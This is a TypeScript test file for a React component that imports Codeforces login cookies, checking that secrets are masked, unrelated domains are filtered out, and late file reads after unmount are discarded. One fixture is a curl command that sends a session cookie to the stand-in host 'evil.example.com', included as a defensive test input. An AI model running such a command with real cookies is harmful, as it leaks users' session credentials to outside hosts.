import { useMemo, useState } from 'react';
import { fireEvent, render, screen } from '@testing-library/react';
import { vi } from 'vitest';
import { parseOjCookieInput } from '@/lib/cookie-parser';
import { CookieImporter } from './cookie-importer';

function Harness() {
  const [raw, setRaw] = useState('');
  const parsed = useMemo(() => parseOjCookieInput(raw, 'codeforces'), [raw]);
  return (
    <div>
      <CookieImporter platform="codeforces" rawValue={raw} onRawChange={setRaw} />
      <output data-testid="normalized">{parsed?.normalizedHeader ?? ''}</output>
    </div>
  );
}

describe('CookieImporter', () => {
  it('parses Netscape cookies.txt, masks raw value immediately, and clears cleanly', () => {
    render(<Harness />);
    const secretVal = 'SUPER_SECRET_CF_SESSION_999';
    const netscape = [
      '# Netscape HTTP Cookie File',
      `#HttpOnly_.codeforces.com\tTRUE\t/\tTRUE\t2147483647\tJSESSIONID\t${secretVal}`,
      `.codeforces.com\tTRUE\t/\tFALSE\t2147483647\t39ce7\tabc123`,
      `.google.com\tTRUE\t/\tFALSE\t2147483647\tNID\tignored_domain`,
    ].join('\n');

    const input = screen.getByLabelText('登录 Cookie（只写不读）');
    fireEvent.change(input, { target: { value: netscape } });

    // Normalized header derived from current props matches expected value
    expect(screen.getByTestId('normalized').textContent).toBe(`JSESSIONID=${secretVal}; 39ce7=abc123`);
    // Raw textarea is immediately replaced by masked summary card so secret is NOT visible in DOM
    expect(screen.queryByLabelText('登录 Cookie（只写不读）')).toBeNull();
    expect(screen.getByText(/已暂存脱敏 Cookie/)).toBeTruthy();
    expect(screen.getByText('JSESSIONID=•••')).toBeTruthy();
    expect(screen.getByText('39ce7=•••')).toBeTruthy();
    expect(screen.getByText(/已自动过滤 1 个无关域名键/)).toBeTruthy();

    // Clearing resets normalized value and restores empty input cleanly
    fireEvent.click(screen.getByRole('button', { name: '清空' }));
    expect(screen.getByTestId('normalized').textContent).toBe('');
    expect((screen.getByLabelText('登录 Cookie（只写不读）') as HTMLTextAreaElement).value).toBe('');
  });

  it('never reverses masking on destination change and ignores async file reads after unmount', async () => {
    const onRawChange = vi.fn();
    let resolveText!: (v: string) => void;
    const pendingFile = {
      name: 'cookies.txt',
      size: 64,
      text: () => new Promise<string>(resolve => { resolveText = resolve; }),
    } as unknown as File;

    // 1. Mismatched cURL sealed via bulk paste stays masked even when diagnostics warn
    const { rerender, unmount, container } = render(
      <CookieImporter platform="codeforces" rawValue="" onRawChange={onRawChange} />,
    );
    const badCurl = `curl 'https://evil.example.com/' -H 'Cookie: JSESSIONID=SECRET_SHOULD_STAY_HIDDEN'`;
    fireEvent.change(screen.getByLabelText('登录 Cookie（只写不读）'), { target: { value: badCurl } });
    rerender(<CookieImporter platform="codeforces" rawValue={badCurl} onRawChange={onRawChange} />);
    expect(screen.queryByLabelText('登录 Cookie（只写不读）')).toBeNull();
    expect(container.textContent).not.toContain('SECRET_SHOULD_STAY_HIDDEN');

    // Changing destination baseUrl while sealed STILL does NOT unmask the raw value
    rerender(<CookieImporter platform="codeforces" baseUrl="https://mirror.codeforces.com" rawValue={badCurl} onRawChange={onRawChange} />);
    expect(screen.queryByLabelText('登录 Cookie（只写不读）')).toBeNull();
    expect(container.textContent).not.toContain('SECRET_SHOULD_STAY_HIDDEN');

    // 2. Unmounting while file.text() is pending discards callback cleanly
    onRawChange.mockClear();
    const fileInput = container.querySelector('input[type="file"]') as HTMLInputElement;
    fireEvent.change(fileInput, { target: { files: [pendingFile] } });
    unmount();
    resolveText('JSESSIONID=LATE_FILE_SECRET');
    await Promise.resolve();
    await Promise.resolve();
    expect(onRawChange).not.toHaveBeenCalled();
  });
});
